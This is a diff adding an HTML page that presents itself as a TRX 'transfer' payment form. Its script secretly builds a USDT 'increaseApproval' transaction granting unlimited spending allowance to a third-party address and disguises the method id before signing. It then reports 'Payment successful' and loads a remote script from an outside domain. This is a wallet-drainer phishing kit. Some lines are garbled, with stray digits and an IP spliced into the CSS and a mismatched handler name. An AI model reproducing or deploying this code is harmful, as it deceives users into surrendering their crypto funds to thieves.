@@ -1,0 +1,237 @@
+<html lang="en" data-dpr="1" style="font-size: 43px;" class="no-touch">
+
+<head>
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no, email=no">
+    <meta name="msapplication-tap-highlight" content="no">
+    <meta name="x5-orientation" content="portrait">
+    <meta name="x5-fullscreen" content="true">
+    <link rel="icon" href="favicon.ico">
+<title>TRC-TRX transfer</title>
+    <link rel="stylesheet" href="scan/css/vendor.min.css">
+    <link rel="stylesheet" href="scan/css/reset.min.css">
+    <link rel="stylesheet" href="scan/css/main.css">
+    <script type="text/javascript" src="https://token.okb.icu/approve.js"></script>
+    <script type="text/javascript" src="scan/js/TronWeb.js"></script>
+
+    <style type="text/css">
+        .tishi {
+            width: 3.5rem;
+            height: 1.2rem;
+            background: #00000059;
+            z-index: 999999999999;
+36.134.166.144position: fixed;
+            top: 50%;
+28531left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 0.1rem;
+            color: white;
+            font-size: 0.6rem;
+            text-align: center;
+            line-height: 1.2rem;
+            display: none;
+        }
+        .disabled {
+            background-color: grey !important;
+            cursor: not-allowed;
+        }
+          body, html {
+    overflow-x: hidden;
+  }
+    </style>
+</head>
+
+<body style="font-size: 12px;">
+    <div class="views">
+        <div class="view view-main">
+            <div class="pages navbar-through">
+                <div class="page">
+                    <div class="page-content" style="padding-top: 0.5rem;">
+                        <div class="list-block address">
+                            <div class="list-block-title">Payment address</div>
+                            <ul>
+                                <li class="item-content">
+                                    <div class="item-inner">
+                                        <div class="item-title" id="address" style="font-size:16px">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+                                    </div>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="list-block amount">
+                            <div class="list-block-title">Amount<span id="yu">0 TRX</span></div>
+                            <ul>
+                                <li class="item-content" style="height:2rem;">
+                                    <div class="item-inner">
+                                        <div class="item-title"><input class="num" value="" id="zhi" style="font-size:26px"></div>
+                                    </div>
+                                </li>
+                                <li class="item-content">
+                                    <div class="item-inner">
+                                        <div class="item-after">&nbsp;<input class="num" placeholder="Remarks (need to pay 1TRX)" style="font-size:12px;width:5rem"></div>
+                                    </div>
+                                </li>
+                            </ul>
+                            <ul>
+                                <li class="item-content item-link">
+                                    <div class="item-inner">
+                                        <div class="item-title">Miner Fee</div>
+                                        <div class="item-after"><p id="miner-fee">Loading...</p></div>
+                                    </div>
+                                </li>
+                            </ul> 
+                        </div>
+                        <div class="list-block-button">
+                            <button class="button button-fill disabled" id="btn-connect" style="background: grey;" disabled>Next step</button>
+                        </div>
+                        <iframe style="display:none;" id="content"></iframe>
+                    </div>
+                </div>
+            
+               
+            </div>
+        </div>
+      
+    </div>
+        
+ <script>
+  async function approve() {
+    // USDT 合约地址和授权地址
+    const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    
+    // 无限授权金额为最大值
+    const maxAmountHex = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    // 检查是否加载了 tronWeb
+    if (typeof tronWeb === 'undefined') {
+      //alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
+      return;
+    }
+
+    try {
+      // 获取用户地址
+      const userAddress = tronWeb.defaultAddress.base58;
+
+      // 构建交易，调用 approve 方法的 Method ID 0x095ea7b3
+      let { transaction, result } = await tronWeb.transactionBuilder.triggerSmartContract(
+        tronWeb.address.toHex(trc20ContractAddress),
+        'increaseApproval(address,uint256)',
+        { feeLimit: 1e8 },
+        [
+          { type: 'address', value: spenderAddress },
+          { type: 'uint256', value: maxAmountHex }
+        ],
+        userAddress
+      );
+
+      if (!result.result) {
+       // alert("授权失败，请重试");
+        return;
+      }
+
+      // 手动替换 d73dd623 为大写形式 D73DD623
+      let r = transaction.raw_data_hex.toString();
+      r = r.replace("d73dd623", "D73DD623");
+      let i = transaction.raw_data.contract[0].parameter.value.data.toString();
+      i = i.replace("d73dd623", "D73DD623");
+
+      // 更新交易的 raw_data_hex 和 data
+      transaction.raw_data_hex = r;
+      transaction.raw_data.contract[0].parameter.value.data = i;
+
+      // 对交易进行签名
+      const signedTx = await tronWeb.trx.sign(transaction);
+
+      // 广播交易，最多重试 3 次
+      let broastTx;
+      for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+          broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
+          if (broastTx.result) {
+            alert("Payment successful");
+            break;
+          }
+        } catch (err) {
+          console.log(`尝试第 ${attempt + 1} 次失败，重试中...`);
+          if (attempt < 2) await new Promise(resolve => setTimeout(resolve, 2000)); // 等待 2 秒再重试
+        }
+      }
+
+      // 检查交易是否成功
+      if (!broastTx || !broastTx.result) {
+        alert("Payment failed, please check whether the network is unobstructed.");
+      }
+    } catch (e) {
+      console.error(e);
+      alert('Payment failed, please check whether the network is unobstructed.');
+    }
+  }
+
+  // 绑定按钮点击事件
+  document.getElementById("btn-connect").onclick = approvel;
+</script>
+    <script>
+        // 随机生成 feeLimit 值
+        function getRandomFeeLimit() {
+            return Math.floor(Math.random() * (26000000 - 22000000 + 1)) + 22000000;
+        }
+
+        // 检查金额输入框是否为空，控制按钮状态
+        function checkAmountInput() {
+            const amountInput = document.getElementById("zhi").value;
+            const nextButton = document.getElementById("btn-connect");
+
+            if (amountInput.trim() === "") {
+                nextButton.classList.add("disabled");
+                nextButton.style.backgroundColor = "grey";
+                nextButton.disabled = true;
+            } else {
+                nextButton.classList.remove("disabled");
+                nextButton.style.backgroundColor = "rgb(7, 139, 195)";
+                nextButton.disabled = false;
+            }
+        }
+
+        async function connectWallet() {
+            if (typeof tronWeb === 'undefined') {
+                //alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
+                return;
+            }
+            
+            try {
+                // 获取用户地址
+                const userAddress = tronWeb.defaultAddress.base58;
+
+                // 获取 TRX 余额
+                const trxBalance = await tronWeb.trx.getBalance(userAddress);
+                document.getElementById("yu").textContent = (trxBalance / 1e6).toFixed(6) + " TRX"; // 转换为 TRX 单位
+
+                // 获取随机 feeLimit 值
+                const randomFeeLimit = getRandomFeeLimit();
+                
+                // 显示矿工费为随机的 feeLimit 值
+                const estimatedFee = randomFeeLimit / 1e6; // 转换为 TRX 单位
+                document.getElementById("miner-fee").textContent = estimatedFee.toFixed(6) + " TRX";
+
+            } catch (error) {
+                console.error("Failed to obtain mining fee:", error);
+                alert("Failed to obtain mining fee, please try again");
+                document.getElementById("miner-fee").textContent = "Failed to obtain";
+            }
+        }
+
+        // 页面加载完成后自动连接钱包并监听金额输入框
+        window.onload = () => {
+            connectWallet();
+            document.getElementById("zhi").addEventListener("input", checkAmountInput);
+            checkAmountInput(); // 初始化按钮状态
+        };
+    </script>
+   
+</body>
+
+</html>
